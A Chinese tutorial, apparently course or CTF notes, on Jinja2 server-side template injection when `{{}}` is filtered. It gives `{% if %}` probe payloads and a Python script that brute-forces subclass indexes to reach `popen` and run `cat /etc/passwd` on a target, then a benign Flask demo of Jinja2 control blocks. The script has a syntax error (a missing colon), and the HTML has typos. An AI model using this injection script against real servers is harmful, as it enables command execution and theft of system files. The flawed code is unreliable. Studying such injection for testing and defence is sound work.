## 进攻路线
---

### 检测 `{{}}` 是否被过滤

当 `{{}}` 被过滤，改用 `{% %}` 测试模板是否仍解析控制语句

示例：
```text

`{%if 2>1%}benben{%endif%}`

回显 `benben`，说明条件控制语句正常执行
```

### 利用 Python 对象链探测

`{% %}` 内部可以调用 Python 对象方法，利用这一点探测对象链是否可达

示例：
```text

`{%if ''.__class__%}benben{%endif%}`

有回显，说明 `''.__class__` 可被访问，对象链可用
```

### 编写脚本遍历可用子类

```python

import requests

url = input("请输入URL链接：")

for i in range(300):
	try:
		payload = {"code": '{%if "".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("cat /etc/passwd").read()%}benben{%endif%}'}
		response = requests.post(url, data=payload)
		if response.status_code == 200:
			if "benben" in response.text
				print(i, "--->", payload)
				break
	except:
		pass

```

## 什么是`{% %}`
---

`{% %}` 是 Flask/Jinja2 模板的控制语句标记，以 `{% end... %}` 结尾

支持在控制语句中定义变量、编写循环和条件判断

### 使用示例

app.py：

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def show1():
	girls = ['如花', '李冰冰', '杨幂', '孙艺珍', '郭德纲']
	return render_template('index.html', girls=girls)
	
if __name__ == '__main__':
	app.run()
```

templates\index.html：

```html

<!DOCTYPe html>
<html lang='en'>
<head>
	<meta charset="utf-8">
	<title 演示控制块 </title>
	<style>
		.a{
			color: red;
			font-weitht: bold;
		}
	</style>
</head>
<body>
<ul>
	{% for girl in girls %}
		{% if girl|length >= 3 %}
		<li class='a'>{{girl}}</li>
		{% else %}
		<li>{{girl}}</li>
		{% endif %}
	{% endfor %}
</ul>
{% set benben='a' %}
{{ benben }}
</body>
</html>

```

渲染结果：

```
· 如花
· 李冰冰(red)
· 杨幂
· 孙艺珍(red)
· 郭德纲(red)
a
```
